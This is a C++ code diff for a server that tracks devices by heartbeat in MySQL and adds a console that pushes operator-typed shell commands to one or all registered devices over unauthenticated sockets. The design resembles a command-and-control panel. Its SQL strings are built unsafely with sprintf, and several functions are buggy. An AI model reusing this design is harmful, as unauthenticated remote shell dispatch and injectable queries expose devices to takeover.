@@ -1,8 +1,14 @@
+#include "configx.h"
 #include "pool.h"
 #include "Mysql_class.h"
 #include <vector>
 #include "myio.h"
+#include <unistd.h>
+#include "socket_control.h"
 
+
+
+Configx Config;
 //======================================accpet============================
 void beatheart(Address* addr)
 {
@@ -17,18 +23,15 @@ void beatheart(Address* addr)
 	char sql[300] = {0};
 	sprintf(sql,"select * from ipaddress where ip='%s'",addr->ip.c_str());
 	string sql_str = sql;
-	DEBUGS(sql);
 	std::vector<string> v = data->select_mysql(sql_str);
 	if(v.size() == 0)
 	{
-		sprintf(sql,"insert into ipaddress(id,ip,heart) values(null,'%s','y')",addr->ip.c_str());
-		DEBUGS(sql);
+		sprintf(sql,"insert into ipaddress(id,ip,heart,breathe) values(null,'%s','y','y')",addr->ip.c_str());
 		data->data_mysql(sql);
 	}
 	else
 	{
-		sprintf(sql,"update ipaddress set heart='y' where ip='%s'",addr->ip.c_str());
-		DEBUGS(sql);
+		sprintf(sql,"update ipaddress set breathe='y',heart='y' where ip='%s'",addr->ip.c_str());
 		data->data_mysql(sql);
 	}
 }
@@ -39,7 +42,7 @@ int mainlist()
 	Socket sock;
 	if(!sock.create_socket())
 		return 0;
-	if(!sock.bind_socket(CONST_PORT))
+	if(!sock.bind_socket(Config.getconfint("ctosport")))
 		return 0;
 	if(!sock.listen_socket())
 		return 0;
@@ -63,6 +66,44 @@ int mainlist()
 //----------------------------------accpet-------------------------
 
 
+//==================================kill============================
+
+
+
+
+bool killer(string ip)
+{
+	MysqlClass* data = MysqlClass::createsql();
+	if(data == NULL)
+	{
+		return false;
+	}
+	char sql[300] = {0};
+	sprintf(sql,"update ipaddress set heart='n',breathe='n' where ip='%s'",ip.c_str());
+	return data->data_mysql(sql);
+}
+
+
+void* timer_kill_zombie(void* argument)
+{
+	MysqlClass* data = MysqlClass::createsql();
+	if(data != NULL)
+	{
+		char sql[300] = {0};
+		sprintf(sql,"update ipaddress set heart='n' where breathe='n'");
+		data->data_mysql(sql);
+		sprintf(sql,"update ipaddress set breathe='n'");
+		data->data_mysql(sql);
+	}
+	sleep(3600*6);
+
+}
+
+
+//----------------------------------kill-------------------------
+
+
+
 //==================================shell============================
 
 bool getdevice(vector<string> *v)
@@ -74,7 +115,7 @@ bool getdevice(vector<string> *v)
 		io->myerr("mysql can`t connect ,date select fail");
 		return false;
 	}
-	io->myout("if choose all device,input 'all' ,else 'show' show all device,'q' quit\n");
+	io->myout("-- all --  choose all device \n-- show -- show all device\n-- ID -- choose one of devices\n-- q -- quit\n");
 	string in1 = io->myin();
 	if(in1 == "all")
 	{
@@ -113,15 +154,118 @@ bool getdevice(vector<string> *v)
 }
 
 
-bool exeshell()
+
+int socketconnect(const vector<string> *devices,vector<Address> *online,vector<string> * offline)
 {
+
+	for(int i = 0; i< devices->size(); i++)
+	{
+		Address addr;
+		if(!addr.init((*devices)[i],Config.getconfint("stocport")))
+		{
+			offline->push_back((*devices)[i]);
+			continue;
+		}
+		Socket sock;
+		if(!sock.create_socket())
+		{
+			offline->push_back((*devices)[i]);
+			continue;
+		}
+		if(!sock.connect_socket(&addr))
+		{
+			offline->push_back((*devices)[i]);
+			continue;
+		}
+		addr.socketfd = sock.mysocketFd ;
+		online->push_back(addr);
+	}
+	return online->size();
+}
+
+
+int socketclose(vector<Address>* online)
+{
+	for (std::vector<Address>::iterator i = online->begin(); i != online->end(); ++i)
+	{
+		close(i->socketfd);
+	}
+}
+
+
+int sendmsg(vector<Address>* online, const void* buff, int size)
+{
+	int cr = 0;
+	for (std::vector<Address>::iterator i = online->begin(); i != online->end(); ++i)
+	{
+		int seek = write(i->socketfd,buff,size);
+		if(seek == size)
+			cr++;
+		else
+		{
+			close(i->socketfd);
+			i = online->erase(i);
+			i--;
+		}
+	}
+	return cr;
+}
+
+
+
+bool stdstep(vector<string>* offline,vector<Address>* online,U_MSG* msgbuff)
+{
+	Myio* io = Myio::createio();
+	MysqlClass* data = MysqlClass::createsql();
+	if(data == NULL)
+	{
+		io->myerr("mysql can`t connect");
+		return false;
+	}
 	std::vector<string> devices;
 	if( !getdevice(&devices) )
 		return false;
 
+	int con_num = socketconnect(&devices,online,offline);
+	if(con_num == 0)
+	{
+		io->myout("sorry, has`n devices what can be connected!\n ");
+		return false;
+	}
+	con_num = sendmsg(online,msgbuff,sizeof(U_MSG));
+	if(con_num == 0)
+	{
+		io->myout("sorry, has`n devices what can be connected! \n");
+		return false;
+	}
 }
 
 
+bool exeshell()
+{
+	Myio* io = Myio::createio();
+
+	std::vector<string> offline;
+	std::vector<Address> online;
+
+	U_MSG shell_buff;
+	shell_buff.shell_m.id = ID_SHELL;
+
+	if(!stdstep(&offline,&online,&shell_buff))
+		return false;
+
+	char st1[100];
+	sprintf(st1,"%d devices has connect , please input shell :",online.size());
+	io->myout(st1);
+
+	string shell = io->myin();
+
+	int con_num = sendmsg(&online,shell.c_str(),shell.size());
+	sprintf(st1,"%d msg has sended",con_num);
+
+	socketclose(&online);
+	return true;
+}
 
 
 //-----------------------------------shell----------------------------------------
@@ -130,8 +274,13 @@ void* communicate(void * argument)
 {
 	Myio* io = Myio::createio();
 	MysqlClass* data = MysqlClass::createsql();
+	if(data == NULL)
+	{
+		io->myerr("mysql can`t connect\n");
+		exit(1);
+	}
 	char st1[100] = {0};
-	std::vector<string> v = data->select_mysql("select * form ipaddress where heart='y'");
+	std::vector<string> v = data->select_mysql("select id from ipaddress where heart='y'");
 	sprintf(st1,"online devices about %d\n",v.size());
 	io->myout(st1);
 
@@ -155,11 +304,9 @@ void* communicate(void * argument)
 		{
 			exeshell();
 		}
-		else 
+		else
 		{
 			io->myout("choose illegal !\n");
 		}
 	}
 }
-
-
